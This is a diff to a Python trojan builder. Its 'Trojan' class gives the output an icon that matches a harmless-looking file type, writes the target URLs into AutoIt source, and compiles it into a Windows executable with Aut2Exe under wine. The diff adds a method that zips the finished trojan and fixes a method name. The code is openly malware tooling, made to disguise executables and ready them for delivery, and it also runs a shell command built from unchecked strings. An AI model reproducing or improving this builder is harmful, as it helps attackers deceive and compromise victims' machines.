@@ -1,6 +1,8 @@
 #!/usr/bin/env python
 import subprocess
 import os
+import zipfile
+
 
 
 TROJAN_SOURCE_CODE_FILE = "trojan.txt"
@@ -31,6 +33,7 @@ class Trojan:
 		self.url1 = url1
 		self.url2 = url2
 		file_type = url1.split(".")[-1].replace("#", "")
+		
 		icons_directory = os.path.dirname(os.path.realpath(__file__)) + "/icons"
 		self.icon = icons_directory + "/" + file_type + ".ico"
 		if icon != None:
@@ -47,7 +50,7 @@ class Trojan:
 		with open(TROJAN_SOURCE_CODE_FILE, "w") as trojan_file:
 			trojan_file.write(urls + trojan_code)
 
-	def compilea(self, out_file):
+	def compile(self, out_file):
 		subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + out_file +'" /Icon "' + self.icon + '"' , shell=True)
 	
 	def set_icon(input_icon):
@@ -62,3 +65,10 @@ class Trojan:
 			icon = "icons/generic.ico"
 		
 		return icon
+	
+	def zip(self, out_file):
+		os.chdir(os.path.dirname(out_file))
+		trojan_name = out_file.split("/")[-1]
+		zip_name = trojan_name.split(".")[0]
+		zipfile.ZipFile(zip_name + ".zip", mode="w").write(trojan_name)
+
